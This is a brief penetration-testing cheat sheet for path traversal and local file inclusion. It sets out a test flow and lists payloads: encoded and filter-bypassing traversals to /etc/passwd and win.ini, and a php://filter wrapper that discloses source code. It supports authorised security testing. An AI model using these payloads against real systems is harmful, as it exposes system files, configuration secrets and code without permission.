# Path Traversal and Local File Inclusion

## Test flow

1. Find file/path parameters in download, template, import, and include endpoints.
2. Probe traversal with relative segments and encodings.
3. Test platform-specific path styles (Linux and Windows).
4. Confirm readable file scope and potential secret disclosure.

## Payload examples

### Linux style

- `../../../../etc/passwd`
- `..%2f..%2f..%2f..%2fetc%2fpasswd`
- `....//....//....//etc/passwd`

### Windows style

- `..\\..\\..\\windows\\win.ini`
- `..%5c..%5c..%5cwindows%5cwin.ini`

### LFI wrappers (when applicable)

- `php://filter/convert.base64-encode/resource=index.php`

## Notes

- Valuable impact includes secret/config leakage and code disclosure.
- Check for traversal in archive extraction flows (zip-slip style paths).
